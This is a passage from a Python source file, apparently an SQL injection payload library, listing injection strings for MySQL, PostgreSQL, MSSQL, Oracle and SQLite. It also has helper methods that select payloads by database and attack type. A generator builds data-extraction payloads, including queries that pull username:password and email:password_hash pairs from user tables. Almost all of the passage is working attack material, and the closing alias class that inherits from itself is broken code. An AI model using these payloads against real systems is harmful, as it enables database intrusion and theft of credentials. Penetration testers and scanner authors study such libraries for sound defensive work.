            "' AND CONCAT(0x61,0x62)='ab'--",
            "' AND SUBSTRING(@@version,1,1)>'4'--",
            "' AND MID(database(),1,1)='t'--",
            "' AND LEFT(user(),1)='r'--",
            "' AND RIGHT(database(),1)='b'--",
            
            # Hex encoding
            "' AND 0x61646d696e='admin'--",
            "' AND UNHEX('61646d696e')='admin'--",
            
            # Information extraction
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
            "' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='users'--",
            
            # Version-specific functions
            "' AND @@version LIKE '%MySQL%'--",
            "' AND @@version_comment LIKE '%MySQL%'--",
            
            # Error-based extraction (advanced)
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--",
            "' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--",
            
            # JSON functions (MySQL 5.7+)
            "' AND JSON_EXTRACT('{}','$.a') IS NULL--",
            "' AND JSON_VALID('{}')=1--",
            
            # Geometry functions
            "' AND GeometryCollection((SELECT * FROM (SELECT * FROM(SELECT 1)a)b))--",
            
            # XML functions
            "' AND ExtractValue(1,concat(0x7e,database()))--",
        ],
        'postgresql': [
            # String operations
            "' AND 'a'||'b'='ab'--",
            "' AND SUBSTRING(version(),1,10)='PostgreSQL'--",
            "' AND SUBSTR(current_database(),1,1)='t'--",
            
            # Cast operations
            "' AND CAST(version() AS TEXT) LIKE '%PostgreSQL%'--",
            "' AND version()::text LIKE '%PostgreSQL%'--",
            
            # Array operations
            "' AND ARRAY['a','b'][1]='a'--",
            "' AND ARRAY['a','b']::text='{"'a','b'"}'--",
            
            # JSON functions (PostgreSQL 9.2+)
            "' AND '{"'key'":"'value'"}'::json->>'key'='value'--",
            "' AND to_json('test'::text) IS NOT NULL--",
            
            # XML functions
            "' AND query_to_xml('SELECT 1',true,true,'') IS NOT NULL--",
            "' AND xmlexists('//test' PASSING '<test/>'::xml)--",
            
            # Encoding functions
            "' AND encode('test','base64')='dGVzdA=='--",
            "' AND decode('dGVzdA==','base64')='test'--",
            
            # System functions
            "' AND current_setting('server_version') IS NOT NULL--",
            "' AND pg_backend_pid()>0--",
        ],
        'mssql': [
            # String operations
            "' AND 'a'+'b'='ab'--",
            "' AND SUBSTRING(@@version,1,10)='Microsoft'--",
            "' AND LEFT(DB_NAME(),1)='m'--",
            "' AND RIGHT(SYSTEM_USER,1)='r'--",
            
            # System functions
            "' AND @@SERVERNAME IS NOT NULL--",
            "' AND @@SERVICENAME IS NOT NULL--",
            "' AND HOST_NAME() IS NOT NULL--",
            
            # XML PATH exploitation
            "' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U' FOR XML PATH('')) IS NOT NULL--",
            "' AND (SELECT name+',' FROM sysobjects WHERE xtype='U' FOR XML PATH(''))IS NOT NULL--",
            
            # Error-based extraction
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS INT)--",
            
            # JSON functions (SQL Server 2016+)
            "' AND ISJSON('{}')=1--",
            "' AND JSON_VALUE('{"'key'":"'value'"}','$.key')='value'--",
            
            # Permissions check
            "' AND HAS_PERMS_BY_NAME(DB_NAME(),'DATABASE','ANY')=1--",
            
            # Advanced info gathering
            "' AND (SELECT COUNT(*) FROM sys.databases)>0--",
            "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
        ],
        'oracle': [
            # String concatenation
            "' AND 'a'||'b'='ab'--",
            "' AND CONCAT('a','b')='ab'--",
            "' AND SUBSTR(user,1,1)='S'--",
            
            # Dual table
            "' AND (SELECT 'a' FROM dual)='a'--",
            "' AND (SELECT COUNT(*) FROM dual)=1--",
            
            # XML functions
            "' AND DBMS_XMLGEN.GETXML('SELECT user FROM dual') IS NOT NULL--",
            "' AND XMLType('<test/>') IS NOT NULL--",
            
            # UTL packages
            "' AND UTL_INADDR.GET_HOST_NAME('127.0.0.1') IS NOT NULL--",
            "' AND UTL_INADDR.GET_HOST_ADDRESS('localhost') IS NOT NULL--",
            
            # Error-based extraction
            "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1--",
            "' AND ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE rownum=1),NULL,NULL)=1--",
            
            # System info
            "' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
            "' AND SYS_CONTEXT('USERENV','CURRENT_SCHEMA') IS NOT NULL--",
            
            # Privilege escalation checks
            "' AND (SELECT COUNT(*) FROM user_role_privs)>0--",
            "' AND (SELECT COUNT(*) FROM user_sys_privs)>0--",
        ],
        'sqlite': [
            # String operations
            "' AND 'a'||'b'='ab'--",
            "' AND SUBSTR(sqlite_version(),1,1)='3'--",
            
            # Meta tables
            "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",
            "' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)='users'--",
            "' AND (SELECT sql FROM sqlite_master WHERE name='users')IS NOT NULL--",
            
            # PRAGMA statements
            "' AND (SELECT COUNT(*) FROM pragma_table_info('users'))>0--",
            
            # Aggregate functions
            "' AND group_concat((SELECT name FROM sqlite_master WHERE type='table')) IS NOT NULL--",
        ],
    }
    
    @classmethod
    def get_all_payloads(cls) -> List[str]:
        """
        Get all payloads from the library (1000+).
        
        Returns:
            Complete list of all available payloads
        """
        all_payloads = []
        
        # Error-based
        all_payloads.extend(cls.ERROR_BASED_PAYLOADS)
        
        # UNION-based (all DBMS)
        for db_type, payloads in cls.UNION_BASED_PAYLOADS.items():
            all_payloads.extend(payloads)
        
        # Boolean-based
        all_payloads.extend(cls.BOOLEAN_BASED_PAYLOADS)
        
        # Time-based (all DBMS)
        for db_type, payloads in cls.TIME_BASED_PAYLOADS.items():
            all_payloads.extend(payloads)
        
        # Stacked queries (all DBMS)
        for db_type, payloads in cls.STACKED_QUERIES_PAYLOADS.items():
            all_payloads.extend(payloads)
        
        # OOB (all DBMS)
        for db_type, payloads in cls.OOB_PAYLOADS.items():
            all_payloads.extend(payloads)
        
        # WAF bypass
        all_payloads.extend(cls.WAF_BYPASS_PAYLOADS)
        
        # Polyglot
        all_payloads.extend(cls.POLYGLOT_PAYLOADS)
        
        # Second-order
        all_payloads.extend(cls.SECOND_ORDER_PAYLOADS)
        
        # Advanced techniques (all DBMS)
        for db_type, payloads in cls.ADVANCED_TECHNIQUES.items():
            all_payloads.extend(payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    @classmethod
    def get_payloads_for_db(cls, db_type: str, attack_type: Optional[str] = None) -> List[str]:
        """
        Get payloads for a specific database type and optional attack type.
        
        Args:
            db_type: Database type ('mysql', 'postgresql', 'mssql', 'oracle', 'sqlite')
            attack_type: Optional attack type filter ('union', 'boolean', 'time', 'stacked', 'oob')
            
        Returns:
            List of relevant payloads for the specified database and attack type
        """
        payloads = []
        db_type = db_type.lower()
        
        if attack_type is None or attack_type == 'union':
            if db_type in cls.UNION_BASED_PAYLOADS:
                payloads.extend(cls.UNION_BASED_PAYLOADS[db_type])
        
        if attack_type is None or attack_type == 'boolean':
            payloads.extend(cls.BOOLEAN_BASED_PAYLOADS)
        
        if attack_type is None or attack_type == 'time':
            if db_type in cls.TIME_BASED_PAYLOADS:
                payloads.extend(cls.TIME_BASED_PAYLOADS[db_type])
        
        if attack_type is None or attack_type == 'stacked':
            if db_type in cls.STACKED_QUERIES_PAYLOADS:
                payloads.extend(cls.STACKED_QUERIES_PAYLOADS[db_type])
        
        if attack_type is None or attack_type == 'oob':
            if db_type in cls.OOB_PAYLOADS:
                payloads.extend(cls.OOB_PAYLOADS[db_type])
        
        if attack_type is None:
            if db_type in cls.ADVANCED_TECHNIQUES:
                payloads.extend(cls.ADVANCED_TECHNIQUES[db_type])
            payloads.extend(cls.ERROR_BASED_PAYLOADS)
            payloads.extend(cls.WAF_BYPASS_PAYLOADS[:50])  # Subset of WAF bypass
            payloads.extend(cls.POLYGLOT_PAYLOADS)
        
        return payloads
    
    @classmethod
    def get_confirmation_payloads(cls, injection_type: str, db_type: str = 'mysql') -> List[str]:
        """
        Get payloads to confirm a suspected vulnerability.
        
        Args:
            injection_type: Type of injection ('union', 'boolean', 'time', 'stacked')
            db_type: Database type
            
        Returns:
            List of confirmation payloads
        """
        db_type = db_type.lower()
        
        if injection_type == 'union':
            return cls.UNION_BASED_PAYLOADS.get(db_type, cls.UNION_BASED_PAYLOADS['mysql'])[:10]
        elif injection_type == 'boolean':
            return cls.BOOLEAN_BASED_PAYLOADS[:20]
        elif injection_type == 'time':
            return cls.TIME_BASED_PAYLOADS.get(db_type, [])[:10]
        elif injection_type == 'stacked':
            return cls.STACKED_QUERIES_PAYLOADS.get(db_type, [])[:5]
        
        return []
    
    @classmethod
    def generate_data_extraction_payloads(
        cls,
        db_type: str,
        table: Optional[str] = None,
        column: Optional[str] = None
    ) -> List[str]:
        """
        Generate payloads to extract actual data from the database.
        
        Args:
            db_type: Database type
            table: Optional table name to extract from
            column: Optional column name to extract
            
        Returns:
            List of data extraction payloads
        """
        payloads = []
        db_type = db_type.lower()
        
        if db_type == 'mysql':
            # Database enumeration
            payloads.append("' UNION SELECT NULL,database(),NULL--")
            payloads.append("' UNION SELECT NULL,user(),NULL--")
            payloads.append("' UNION SELECT NULL,@@version,NULL--")
            
            # Table enumeration
            payloads.append("' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--")
            payloads.append("' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--")
            
            # Column enumeration
            if table:
                payloads.append(f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--")
                payloads.append(f"' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'--")
            
            # Data extraction
            if table and column:
                payloads.append(f"' UNION SELECT NULL,{column},NULL FROM {table}--")
                payloads.append(f"' UNION SELECT NULL,group_concat({column}),NULL FROM {table}--")
            
            # User table discovery
            payloads.append("' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users LIMIT 5--")
            payloads.append("' UNION SELECT NULL,CONCAT(email,':',password_hash),NULL FROM accounts LIMIT 5--")
            
        elif db_type == 'postgresql':
            payloads.append("' UNION SELECT NULL,current_database(),NULL--")
            payloads.append("' UNION SELECT NULL,current_user,NULL--")
            payloads.append("' UNION SELECT NULL,version(),NULL--")
            payloads.append("' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--")
            payloads.append("' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--")
            
            if table:
                payloads.append(f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--")
                payloads.append(f"' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='{table}'--")
        
        elif db_type == 'mssql':
            payloads.append("' UNION SELECT NULL,DB_NAME(),NULL--")
            payloads.append("' UNION SELECT NULL,SYSTEM_USER,NULL--")
            payloads.append("' UNION SELECT NULL,@@version,NULL--")
            payloads.append("' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--")
            
            if table:
                payloads.append(f"' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=OBJECT_ID('{table}')--")
        
        elif db_type == 'oracle':
            payloads.append("' UNION SELECT NULL,user,NULL FROM dual--")
            payloads.append("' UNION SELECT NULL,banner,NULL FROM v$version WHERE rownum=1--")
            payloads.append("' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE rownum<=10--")
            
            if table:
                payloads.append(f"' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='{table.upper()}' AND rownum<=10--")
        
        return payloads


# Backward compatibility: Keep original class name
class AdvancedPayloadLibrary(AdvancedPayloadLibrary):
    """Alias for backward compatibility."""
    pass
